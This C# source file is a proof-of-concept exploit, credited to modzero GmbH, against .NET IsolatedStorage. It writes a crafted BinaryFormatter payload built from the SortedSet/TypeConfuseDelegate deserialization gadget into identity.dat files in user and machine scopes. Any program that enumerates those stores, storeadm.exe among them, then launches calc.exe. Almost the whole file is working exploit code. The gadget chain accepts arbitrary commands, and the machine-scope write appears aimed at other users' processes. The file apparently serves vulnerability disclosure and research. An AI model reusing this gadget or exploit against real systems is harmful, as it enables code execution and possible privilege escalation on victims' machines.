using System;
using System.Collections.Generic;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.IO.IsolatedStorage;
using System.Security.Policy;

namespace IsolatedStoragePoC
{
    //Nils Ole Timm of modzero GmbH 2020
    class Program
    {
        //After executing this run "storeadm /LIST" in the visual studio developers console
        static void Main(string[] args)
        {
            //Create a manipulated identity.dat file in the machine and the user roaming scope
            ManipulateStorageSpace(IsolatedStorageScope.Assembly | IsolatedStorageScope.User | IsolatedStorageScope.Roaming);
            ManipulateStorageSpace(IsolatedStorageScope.Assembly | IsolatedStorageScope.Machine);

            //IsolatedStorageFileEnumerator::MoveNext() triggers the actual vulnerability
            //Any program using it (like storeadm.exe) is vulnerable
            //Select which scope to enumerate by uncommenting the correct line below
            //var enumerator = IsolatedStorageFile.GetEnumerator(IsolatedStorageScope.Machine);
            var enumerator = IsolatedStorageFile.GetEnumerator(IsolatedStorageScope.Roaming | IsolatedStorageScope.User);
            while (enumerator.MoveNext()) { }
        }

        //Creates a crafted identity.dat file that will space calc.exe when read by the enumerator
        static void ManipulateStorageSpace(IsolatedStorageScope scope)
        {
            //Initialize IsolatedStorage, this creates the necessary structures in the specified scope
            //and creates a space that contains an identity.dat file that's writable by the current user
            IsolatedStorageFile isf = IsolatedStorageFile.GetStore(scope, null, null);

            //Extract the created path using reflection
            FieldInfo isf_fi = typeof(IsolatedStorageFile).GetField("m_InfoFile", BindingFlags.NonPublic | BindingFlags.Instance);
            string infoPath = (string)isf_fi.GetValue(isf);
            string identityPath = Path.Combine(Path.GetDirectoryName(infoPath), "identity.dat");

            //This generates a relatively standard payload using the SortedSet deserialization gadget
            //with James Forshaws TypeConfuseDelegate
            MemoryStream mem = new MemoryStream();
            BinaryFormatter formatter = new BinaryFormatter();
            formatter.Serialize(mem, GeneratePayload());
            //formatter.Serialize(mem, GeneratePayload());
            mem.Position = 0;
            object test = formatter.Deserialize(mem);

            //Write the payload into the identity.dat file
            File.WriteAllBytes(identityPath, mem.ToArray());
        }

        //Standard TypeConfuseDelegate gadget with SortedSet`1
        //Triggers delegate execution on deserialization
        //More info at https://googleprojectzero.blogspot.com/2017/04/
        static object GeneratePayload()
        {
            Comparison<string> c = new Comparison<string>(string.Compare);
            var c2 = Func<string, string, int>.Combine(c, c);
            TypeConfuseDelegate(c2, new Func<string, string, Process>(Process.Start));
            Comparison<string> c3 = (Comparison<string>)c2;
            SortedSet<string> s = new SortedSet<string>(new string[] { "calc", "a" });
            FieldInfo fi = typeof(SortedSet<string>).GetField("comparer",
                BindingFlags.NonPublic | BindingFlags.Instance);
            fi.SetValue(s, Comparer<string>.Create(c3));
            return s;
        }

        //Runtime aware TypeConfuseDelegate Gadget
        static void TypeConfuseDelegate(Delegate handler, Delegate target)
        {
            FieldInfo fi;
            if (IsRunningOnMono())
                fi = typeof(MulticastDelegate).GetField("delegates",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            else
                fi = typeof(MulticastDelegate).GetField("_invocationList",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = handler.GetInvocationList();
            
            //invoke_list[0] = target;
            invoke_list[1] = target;
            fi.SetValue(handler, invoke_list);
        }

        public static bool IsRunningOnMono()
        {
            return Type.GetType("Mono.Runtime") != null;
        }
    }
}
